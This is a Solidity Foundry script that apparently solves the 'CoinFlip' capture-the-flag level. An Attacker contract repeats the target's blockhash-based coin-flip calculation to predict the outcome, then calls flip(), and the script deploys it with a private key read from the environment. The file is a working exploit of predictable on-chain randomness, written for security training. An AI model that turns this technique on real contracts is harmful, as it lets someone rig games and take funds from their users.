// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { CoinFlip } from "../src/03_CoinFlip.sol";


contract Attacker {
  
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _challengeAddress) {
    CoinFlip challenge = CoinFlip(_challengeAddress);
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    challenge.flip(side);
    console.log("Consecutive wins: %s", challenge.consecutiveWins());
  }

}

contract CoinFlipAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("CoinFlip"));
    
    vm.startBroadcast(deployerPrivateKey);
    new Attacker(challengeInstanceAddress);
    vm.stopBroadcast();
  }

}